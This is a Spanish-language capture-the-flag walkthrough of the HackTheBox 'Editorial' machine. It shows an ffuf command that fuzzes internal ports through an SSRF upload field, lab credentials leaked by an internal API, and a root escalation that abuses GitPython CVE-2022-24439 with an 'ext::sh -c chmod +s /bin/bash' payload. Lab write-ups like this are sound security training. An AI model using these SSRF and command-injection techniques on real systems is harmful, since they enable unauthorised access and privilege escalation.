@@ -1,0 +1,173 @@
+# Editorial Walkthrough
+
+## Enumeration
+Lo primero que hacemos es un scaneo con nmap que lo unico que nos dice es que el puerto 22 y 80 estan abiertos así procedemos a analizar la página web en busca de vectores de ataque. Encontramos un formulario con dos campos interesantes, el primero nos permite subir un archivo de nuestro dispositivo a la web, quizá podamos usar esto para subir una webshell. 
+
+
+## Exploitation
+Al probar a subir archivos vemos que el servidor les cambia el nombre y le quita la extensión por lo que no parece que haya mucho que podamos hacer por aquí, también intente un XXE por si acaso se cargará el script an la respuesta del servidor pero nada. 
+
+El otro campo interesante nos perimte introducir una URL para cargar una imagen, quiza podamos usar esto para ejecutar un SSRF, al comprobar si es vulnerable mandandonos una request a nosotros mismos vemos que efectivamente nos llega una request por lo uqe parece no haber firewalls ni nada por el estilo.
+
+Podemos aprovechar esta vulnerabilidad para enumerar endpoints restringidos que no son accesibles publicamente. Esto lo hacemos con el siguiente comando:
+
+`ffuf -X $'POST'  -H $'Host: editorial.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: multipart/form-data; boundary=---------------------------67565714431841667581711409638' -H $'Content-Length: 359' -H $'Origin: http://editorial.htb' -H $'Connection: keep-alive' -H $'Referer: http://editorial.htb/upload' \
+    -d $'-----------------------------67565714431841667581711409638\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:FUZZ\x0d\x0a-----------------------------67565714431841667581711409638\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------67565714431841667581711409638--\x0d\x0a'  -u http://editorial.htb/upload-cover -w ../../Academy/ServerSideAttacks/ports -fs 61`
+
+```
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://editorial.htb/upload-cover
+ :: Wordlist         : FUZZ: /home/ar70n/Proyects/HTB/Academy/ServerSideAttacks/ports
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Content-Type: multipart/form-data; boundary=---------------------------67565714431841667581711409638
+ :: Header           : Referer: http://editorial.htb/upload
+ :: Header           : Host: editorial.htb
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+ :: Header           : Accept: */*
+ :: Header           : Connection: keep-alive
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Content-Length: 359
+ :: Header           : Origin: http://editorial.htb
+ :: Data             : -----------------------------67565714431841667581711409638
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ
+-----------------------------67565714431841667581711409638
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------67565714431841667581711409638--
+
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 61
+________________________________________________
+
+5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 143ms]
+:: Progress: [10000/10000] :: Job [1/1] :: 257 req/sec :: Duration: [0:00:26] :: Errors: 1 ::
+```
+
+Notese que copiamos la request de Burp usando copiar como curl y luego la modificamos para que funcione con ffuf
+Despues de descargarnos el archivo, introduciendo en el campo de la URL la siguiente direccion :http://127.0.0.1:5000/ nos encontramos con el siguiente archivo:
+
+
+```json
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sended to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the api.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of api.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+
+```
+Ahora enviaremos peticiones al servidor http://127.0.0.1:5000/... con cada uno de los apartados, al probar con /api/latest/metadata/messages/authors dimos con un archivo que contenia unas credenciales:
+
+```json
+{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
+}
+```
+
+## Privilege Escalation
+
+Ahora nos conectamos al servidor a traves de SSH con las credenciales obtenidas. Dentro de nuestro directorio home vemos una carpeta la cual contiene las credenciales del usuario prod. Ahora con estos dos usuarios tenemos que intentar escalar privilegios, el ususario dev no tiene permiso de sudo sobre ningun comando mientras que prod puede ejecutar sudo en una ocasion:
+
+```
+sudo -l
+[sudo] password for prod:
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+```
+
+Tenemos acceso a un script en python que srive para montar un repositorio de git en la maquina. Si vemos las funciones que utiliza el script son de la librería estandar de python y de gitpython la cual en la version de la maquina tiene una vulnerabilidad RCE: CVE-2022-24439
+
+```python
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir('/opt/internal_apps/clone_changes')
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init('', bare=True)
+r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
+```
+Referencia:https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
+
+Luego ejecutando el siguiente comando estaremo estableciendo los bits de SUID y SGID a 1 lo que nos va a permitir ejecutar `/bin/bash' como root 
+
+```bash
+prod@editorial:~$ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c chmod% +s% /bin/bash"
+
+<...SNIP...>
+
+prod@editorial:~$ ls -l /bin/bash #El -p flag preserva los privilegios del proceso, lo que es útil si el bit SUID está establecido.
+-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash
+prod@editorial:~$ /bin/bash -p
+bash-5.1# id
+uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod)
+```
+
